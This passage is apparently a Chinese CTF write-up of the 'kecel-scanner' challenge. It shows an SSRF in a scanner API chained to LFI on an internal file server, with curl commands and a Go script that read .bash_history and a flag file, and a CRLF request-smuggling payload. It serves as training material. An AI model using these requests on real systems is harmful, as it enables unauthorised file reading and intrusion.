+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;url&quot;:&quot;http://172.19.0.6:5000/download?file=/home/system_admin/.bash_history&quot;,&quot;version&quot;:&quot;1.1&quot;,&quot;headers&quot;:{}}&#39;</span>
+</code></pre></div>
+<p><strong>返回内容：</strong>
+<div class="highlight"><pre><span></span><code>cat /home/system_admin/secret_flag.txt
+</code></pre></div></p>
+<h3 id="6-flag">6. 获取 Flag<a class="headerlink" href="#6-flag" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://95.111.234.103:5050/api/mine<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;url&quot;:&quot;http://172.19.0.6:5000/download?file=/home/system_admin/secret_flag.txt&quot;,&quot;version&quot;:&quot;1.1&quot;,&quot;headers&quot;:{}}&#39;</span>
+</code></pre></div>
+<p><strong>返回：</strong> <code>novruzctf{d1r3ct0ry_tr4v3rs4l_1s_l1k3_m4g1c}</code></p>
+<h2 id="_3">漏洞分析 / 机制分析<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>SSRF</strong>：扫描器后端会对用户提供的 URL 发起请求，未严格限制内网地址。</li>
+<li><strong>内网文件服务器 LFI</strong>：<code>/download?file=</code> 未校验路径，<code>os.path.join</code> 在绝对路径时直接返回原路径。</li>
+<li><strong>信息泄露链</strong>：<code>/api/mine</code> 公开扫描记录 → 暴露内网拓扑与服务端点。</li>
+<li><strong>未解说明</strong>：当前拿到的文件服务器 flag 已证伪，最终 flag 尚未确认。</li>
+</ul>
+<h3 id="go">Go 版本自动化请求脚本<a class="headerlink" href="#go" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">package</span><span class="w"> </span><span class="nx">main</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="s">&quot;bytes&quot;</span>
+<span class="w">    </span><span class="s">&quot;encoding/json&quot;</span>
+<span class="w">    </span><span class="s">&quot;fmt&quot;</span>
+<span class="w">    </span><span class="s">&quot;io&quot;</span>
+<span class="w">    </span><span class="s">&quot;net/http&quot;</span>
+<span class="p">)</span>
+
+<span class="kd">type</span><span class="w"> </span><span class="nx">Req</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">URL</span><span class="w">     </span><span class="kt">string</span><span class="w">            </span><span class="s">`json:&quot;url&quot;`</span>
+<span class="w">    </span><span class="nx">Version</span><span class="w"> </span><span class="kt">string</span><span class="w">            </span><span class="s">`json:&quot;version&quot;`</span>
+<span class="w">    </span><span class="nx">Headers</span><span class="w"> </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="w"> </span><span class="s">`json:&quot;headers&quot;`</span>
+<span class="p">}</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">payload</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">Req</span><span class="p">{</span>
+<span class="w">        </span><span class="nx">URL</span><span class="p">:</span><span class="w">     </span><span class="s">&quot;http://172.19.0.6:5000/download?file=/home/system_admin/secret_flag.txt&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">Version</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;1.1&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">Headers</span><span class="p">:</span><span class="w"> </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{},</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">buf</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">json</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">resp</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">Post</span><span class="p">(</span><span class="s">&quot;http://95.111.234.103:5050/api/mine&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;application/json&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nx">NewBuffer</span><span class="p">(</span><span class="nx">buf</span><span class="p">))</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">defer</span><span class="w"> </span><span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+<span class="w">    </span><span class="nx">body</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">io</span><span class="p">.</span><span class="nx">ReadAll</span><span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">body</span><span class="p">))</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="_4">完整网络拓扑<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>用户 → Caddy (反向代理, :5050) → uvicorn:5000 (FastAPI/Scanner)
+                                        ↓ SSRF
+                                  aiohttp GET → 目标URL
+                                        ↓
+                ┌───────────────────────┼───────────────────────┐
+                ↓                       ↓                       ↓
+      Flask File Server          Novruzland Login         OpenResty Login
+      172.19.0.6:5000            172.19.0.4:80            172.19.0.5:80
+      Werkzeug/2.2.3             Go HTTP                  nginx + PHP
+      [LFI 漏洞!]               [登录页]                  [登录页]
+
+                                Docker Gateway
+                                172.17.0.1:3000
+                                Express (Ghost Machine)
+                                [PP flag - 另一题]
+</code></pre></div>
+<h2 id="_5">未完成的攻击思路<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h3 id="1-crlf-via-version">1. CRLF 注入 via version 列表类型（最有希望）<a class="headerlink" href="#1-crlf-via-version" title="Permanent link">&para;</a></h3>
+<p>发现 scanner 的 <code>version</code> 参数接受 JSON 列表类型 <code>["1","1"]</code>，且能正常处理。后端使用 aiohttp 3.8.5，存在已知 CRLF 注入漏洞（CVE-2023-49081）。</p>
+<p><strong>假设</strong>: 当 version 为列表时，scanner 可能拼接列表元素构造 HTTP 版本字符串而不经过 <code>int()</code> 验证，从而允许在版本字段中注入 CRLF 字符实现 HTTP Request Smuggling。</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="s2">&quot;http://172.19.0.2:5000/api/&quot;</span><span class="p">,</span><span class="nt">&quot;version&quot;</span><span class="p">:[</span><span class="s2">&quot;1&quot;</span><span class="p">,</span><span class="s2">&quot;1\r\nHost: 172.19.0.2:5000\r\n\r\nGET /flag.txt HTTP/1.0\r\n\r\n&quot;</span><span class="p">],</span><span class="nt">&quot;headers&quot;</span><span class="p">:{}}</span>
+</code></pre></div>
+<p><strong>状态</strong>: 任务提交后处于 pending 状态，服务器随后关闭，未能获取结果。</p>
+<h3 id="2-file-scanner">2. 通过 file:// 协议读取 Scanner 容器文件<a class="headerlink" href="#2-file-scanner" title="Permanent link">&para;</a></h3>
+<p>未测试 aiohttp 是否支持 <code>file://</code> 协议 scheme。如果支持，可直接读取 Scanner 容器上的 <code>/flag.txt</code>。</p>
+<h3 id="3-novruzlandopenresty">3. Novruzland/OpenResty 登录页凭据<a class="headerlink" href="#3-novruzlandopenresty" title="Permanent link">&para;</a></h3>
+<p>可能需要从文件服务器的 LFI 中找到其他容器的登录凭据，然后通过登录获取 flag。</p>
+<h3 id="4-scanner">4. Scanner 源码审计<a class="headerlink" href="#4-scanner" title="Permanent link">&para;</a></h3>
+<p>通过 LFI 读取 Scanner 自身的源码（如 <code>/usr/src/app/main.py</code>），可能发现隐藏端点或直接获取 flag 路径。</p>
+<h2 id="_6">踩过的坑<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<h3 id="flag-rabbit-hole">文件服务器的 flag 是 rabbit hole<a class="headerlink" href="#flag-rabbit-hole" title="Permanent link">&para;</a></h3>
+<p>从 <code>172.19.0.6</code> 文件服务器 <code>/home/system_admin/secret_flag.txt</code> 获取的 <code>novruzctf{d1r3ct0ry_tr4v3rs4l_1s_l1k3_m4g1c}</code> 提交后显示错误。该 flag 可能属于其他题目，也可能是故意设置的陷阱。真正的 flag 很可能需要读取 Scanner 容器（172.19.0.2）上的 <code>/flag.txt</code>。</p>
+<h3 id="spa-catch-all-flagtxt">SPA Catch-All 阻止直接访问 /flag.txt<a class="headerlink" href="#spa-catch-all-flagtxt" title="Permanent link">&para;</a></h3>
+<p>Scanner 使用 Svelte SPA + FastAPI，所有非 <code>/api/</code> 路径都被 SPA catch-all 拦截返回前端 HTML。需要绕过这层路由才能读取 <code>/flag.txt</code>。</p>
+<h3 id="crlf-url-headers">CRLF 注入在 URL 和 Headers 中被阻断<a class="headerlink" href="#crlf-url-headers" title="Permanent link">&para;</a></h3>
+<ul>
+<li>URL 中的 CRLF 字符被 aiohttp URL-encode</li>
+<li>Headers 中的 CRLF 被 aiohttp 检测并拒绝（"Newline or carriage return character detected"）</li>
+<li>version 字符串经过 <code>int()</code> 验证，非数字内容被拒绝</li>
+<li><strong>但 version 列表类型可能绕过 int() 验证</strong> — 这是最后发现的突破口</li>
+</ul>
+<h3 id="ip">IP 过滤其实没那么严格<a class="headerlink" href="#ip" title="Permanent link">&para;</a></h3>
+<p><code>127.0.0.1</code> 直接可用（dig 返回空，不在黑名单），Docker 内部 IP <code>172.19.0.x</code> 也未被过滤。不需要 DNS rebinding 绕过。</p>
+<h3 id="_7">其他玩家的扫描记录是重要信息源<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p>通过 <code>GET /api/mine</code> 可以看到所有玩家的扫描记录，从中发现了内部 Docker 网络 IP 和文件服务器的存在。</p>
+<h2 id="_8">知识点<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<ol>
+<li><strong>SSRF 链式利用</strong>：SSRF → 内网探测 → 发现新服务 → 利用新服务的漏洞</li>
+<li><strong>Docker 内网探测</strong>：CTF 中常见的 <code>172.17.0.x</code> 和 <code>172.19.0.x</code> 网段</li>
+<li><strong>LFI 中 os.path.join 的陷阱</strong>：Python 的 <code>os.path.join(base, user_input)</code> 在 <code>user_input</code> 为绝对路径时完全忽略 <code>base</code></li>
+<li><strong>bash_history 信息泄露</strong>：用户命令历史常暴露敏感文件路径</li>
+<li><strong>共享环境中的多题信息</strong>：多题共享 Docker 环境时，扫描记录可能包含其他玩家发现的有用信息</li>
+<li><strong>aiohttp 3.8.5 CVE-2023-49081</strong>：version 参数的类型混淆可能绕过 CRLF 过滤</li>
+<li><strong>CTF 中的 rabbit hole</strong>：第一个找到的 flag 不一定是正确的，需要验证提交</li>
+</ol>
+<h2 id="gui">命令行提取关键数据（无 GUI）<a class="headerlink" href="#gui" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># 拉取 OpenAPI 文档，快速枚举接口</span>
+curl<span class="w"> </span>-s<span class="w"> </span>http://95.111.234.103:5050/openapi.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>head
+
+<span class="c1"># 创建 SSRF 扫描任务</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://95.111.234.103:5050/api/mine<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;url&quot;:&quot;http://127.0.0.1:5000/api/&quot;,&quot;version&quot;:&quot;1.1&quot;,&quot;headers&quot;:{}}&#39;</span>
+
+<span class="c1"># 查看扫描记录</span>
+curl<span class="w"> </span>-s<span class="w"> </span>http://95.111.234.103:5050/api/mine
+</code></pre></div>
+<h2 id="_9">推荐工具与优化解题流程<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<h3 id="_10">推荐工具<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Burp Suite</strong>：构造 JSON 请求、复用历史记录</li>
+<li><strong>ffuf</strong>：枚举内网端口/路径（结合 SSRF）</li>
+<li><strong>nuclei</strong>：快速 SSRF 探测模板（可辅助确认）</li>
+</ul>
+<h3 id="_11">工具对比总结<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>适用阶段</th>
+<th>本题耗时</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Burp Suite</strong></td>
+<td>请求构造与调试</td>
+<td>~10 分钟</td>
+<td>Repeater 迭代快</td>
+<td>需要 GUI</td>
+</tr>
+<tr>
+<td><strong>ffuf</strong></td>
+<td>内网枚举</td>
+<td>~10 分钟</td>
+<td>扫描速度快</td>
+<td>需要字典</td>
+</tr>
+<tr>
+<td><strong>nuclei</strong></td>
+<td>自动模板探测</td>
+<td>~5 分钟</td>
+<td>一键扫描</td>
+<td>覆盖有限</td>
+</tr>
+<tr>
+<td><strong>curl</strong></td>
+<td>快速验证</td>
+<td>~5 分钟</td>
+<td>无依赖</td>
+<td>交互不便</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_12">推荐流程<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p><strong>推荐流程</strong>：curl/Burp 复现 SSRF → ffuf 枚举内网服务 → LFI 验证与信息链收集 → 待补最终 flag。</p>
+<h2 id="_13">脚本归档<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Go：<a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_go/NovruzCTF_kecel-scanner.go" target="_blank"><code>NovruzCTF_kecel-scanner.go</code> <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3m-2 16H5V5h7V3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7h-2z"/></svg></span></a></li>
+<li>Python：<a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/NovruzCTF_kecel-scanner.py" target="_blank"><code>NovruzCTF_kecel-scanner.py</code> <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3m-2 16H5V5h7V3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7h-2z"/></svg></span></a></li>
+</ul>
+<h2 id="_14">使用的工具<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h2>
+<ul>
+<li><code>curl</code> - 发送 HTTP/API 请求</li>
+<li>Playwright (浏览器自动化) - 初始页面探索</li>
+<li>扫描器自身的 <code>/api/mine</code> 记录 - 获取其他玩家的内网探测结果</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="__comments">评论</h2>
+
+<script
+  src="https://giscus.app/client.js"
+  data-repo="your-username/your-repo"
+  data-repo-id=""
+  data-category="Writeup Comments"
+  data-category-id=""
+  data-mapping="pathname"
+  data-strict="1"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="top"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  data-loading="lazy"
+  crossorigin="anonymous"
+  async>
+</script>
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.path", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mathjax.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../javascripts/drawer-backdrop.js"></script>
+      
+    
+  </body>
+</html>
